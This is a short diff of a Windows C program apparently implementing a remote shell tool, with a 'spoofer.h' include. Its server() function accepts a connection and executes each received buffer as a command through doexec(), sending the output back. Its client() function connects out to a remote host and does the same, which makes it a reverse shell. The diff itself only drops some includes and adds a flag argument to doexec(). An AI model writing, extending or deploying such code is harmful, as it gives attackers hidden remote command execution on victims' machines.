@@ -1,7 +1,3 @@
-#include <winsock2.h>
-#include <Windows.h>
-#include <stdio.h>
-#include <Lmcons.h>
 #include "doexec.h"
 #include "spoofer.h"
 
@@ -67,7 +63,7 @@ int server(int port){
     client = accept(server, (SOCKADDR *)&clientAddr, &clientAddrSize);
     welcomeMessage(client);
     while (recv(client, buffer, sizeof(buffer), 0) > 0) {
-        char *ans = doexec(buffer);
+        char *ans = doexec(buffer, TRUE);
         send(client, ans, strlen(ans) * sizeof(char) + 1,0);
         command_prompt(client);
         memset(buffer, '\0', sizeof(buffer));
@@ -92,7 +88,7 @@ int client(char *rhost, int port){
     welcomeMessage(s);
     char buffer[1024];
     while (recv(s, buffer, sizeof(buffer), 0) > 0) {
-        char *ans = doexec(buffer);
+        char *ans = doexec(buffer, 1);
         send(s, ans, strlen(ans) * sizeof(char),0);
         command_prompt(s);
         memset(buffer, '\0', sizeof(buffer));
